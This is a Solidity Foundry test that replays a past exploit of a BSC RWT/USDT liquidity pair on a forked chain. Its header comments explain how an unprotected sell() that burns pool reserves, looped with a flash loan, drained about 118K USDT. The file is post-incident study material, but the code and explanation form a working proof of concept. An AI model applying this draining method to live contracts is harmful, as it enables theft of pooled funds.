// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~118,000 USDT
// Attacker      : 0x84DD3A5D4DE44c8ad0CE032BeAb8bc3f01D1dcf7
// Attack Contract : 0x7ed953Ff42509568f620aa340a33A9373447f4CE (unverified)
// Sell Contract : 0x8812bb5FB89d69d35Ac84D2C37B55769395b9f90 (unverified, holds RWT owner role)
// Victim (RWT/USDT PancakePair) : 0xc1c2ef25372f12ce18d35044446064b720c4aa27
// Attack Tx     : https://bscscan.com/tx/0x22300140e7c44899c2602382a6e7a4a34a70f47f9736721744bc6434c07171dc
//
// @Analysis
// Root cause: the unverified "sell" contract (0x8812...) exposes an unprotected sell() that each call swaps
// RWT->USDT into the RWT/USDT PancakePair, adds liquidity, then burns ~72M RWT directly out of the pair's
// reserves (RWT.burn is onlyOwner and the sell contract holds that role) and calls sync(). Repeatedly burning
// the pool's RWT collapses its RWT reserve and inflates RWT's USDT price, letting the caller extract USDT from
// the LP above fair value. The attacker flash-loaned 1M USDT and looped the routine 18x, draining the pair
// (-158.6K USDT / -110M RWT) and netting ~118K USDT.
//
// @Replay
// The exploit tx is a direct call (not a CREATE) to an already-deployed attack contract with selector
// 0x695581b2 and four address args. We fork one block before the exploit (the attack + sell contracts are
// already deployed at that state), prank the attacker as both tx.origin and msg.sender, and replay the exact
// on-chain calldata. Profit is forwarded by the attack contract to tx.origin (the attacker EOA).

contract RWTExploit is BaseTestWithBalanceLog {
    address constant ATTACKER = 0x84DD3A5D4DE44c8ad0CE032BeAb8bc3f01D1dcf7;
    address constant ATTACK_CONTRACT = 0x7ed953Ff42509568f620aa340a33A9373447f4CE;
    address constant SELL_CONTRACT = 0x8812bB5fB89D69D35Ac84D2C37B55769395b9f90;
    address constant RWT_USDT_PAIR = 0xC1c2ef25372f12CE18d35044446064B720C4aA27;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;

    uint256 constant FORK_BLOCK = 110_827_952;

    // Exact calldata from the exploit tx: sell(0xf8a3.., pair, sellContract, recipientEOA).
    bytes constant EXPLOIT_CALLDATA =
        hex"695581b2000000000000000000000000f8a36777415c09feaff3dc78dcbb3ed00ce989cd000000000000000000000000c1c2ef25372f12ce18d35044446064b720c4aa270000000000000000000000008812bb5fb89d69d35ac84d2c37b55769395b9f90000000000000000000000000418a87640beebaca8f013d237ee5595a521a6d3b";

    function setUp() public {
        vm.createSelectFork("bsc", FORK_BLOCK - 1);

        fundingToken = USDT;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "AttackContract");
        vm.label(SELL_CONTRACT, "SellContract");
        vm.label(RWT_USDT_PAIR, "RWT/USDT Pair");
        vm.label(USDT, "USDT");
    }

    function testExploit() public balanceLog {
        uint256 usdtBefore = IERC20(USDT).balanceOf(ATTACKER);

        // Replay the exact tx: attacker EOA as tx.origin AND msg.sender, on-chain attack-contract bytecode.
        vm.prank(ATTACKER, ATTACKER);
        (bool ok,) = ATTACK_CONTRACT.call(EXPLOIT_CALLDATA);
        require(ok, "exploit call reverted");

        uint256 gain = IERC20(USDT).balanceOf(ATTACKER) - usdtBefore;
        emit log_named_decimal_uint("Attacker USDT profit", gain, 18);

        assertApproxEqAbs(gain, 118_000 ether, 2000 ether, "expected ~118k USDT profit");
    }
}
